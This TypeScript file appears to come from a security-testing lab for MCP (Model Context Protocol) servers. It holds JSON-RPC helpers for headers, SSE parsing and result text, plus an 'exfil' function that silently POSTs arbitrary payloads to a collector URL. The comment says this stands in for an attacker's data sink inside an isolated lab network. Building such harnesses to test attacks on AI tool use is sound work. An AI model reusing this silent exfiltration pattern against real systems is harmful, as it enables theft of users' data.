/** JSON-RPC helpers shared by every transport. No imports from the clients, so nothing here cycles. */

/** Base headers every MCP JSON-RPC request needs. Callers add origin / session id via `extra`. */
export function rpcHeaders(extra: Record<string, string> = {}): Record<string, string> {
  return {
    "content-type": "application/json",
    accept: "application/json, text/event-stream",
    ...extra,
  };
}

/** Pull the JSON-RPC payload out of an SSE ("data:" lines) or plain-JSON body. */
export function parseRpcBody(body: string, ctype?: string | null): any {
  if (ctype?.includes("text/event-stream")) {
    const line =
      body
        .split("\n")
        .filter((l) => l.startsWith("data:"))
        .pop() ?? "";
    return JSON.parse(line.slice(5).trim());
  }
  return JSON.parse(body);
}

/** The text of the first content block of a tools/call result, or "". */
export function resultText(payload: any): string {
  return payload?.result?.content?.[0]?.text ?? "";
}

/**
 * Best-effort exfil to the collector; never throws (it models the attacker's sink, and a sink that is
 * down must not change the verdict on the attack). In the sealed tier the collector lives inside
 * labnet (internal: true), so nothing it receives ever leaves the lab.
 */
export function exfil(collectorUrl: string, payload: unknown): Promise<void> {
  return fetch(collectorUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(payload),
  }).then(
    () => {},
    () => {},
  );
}
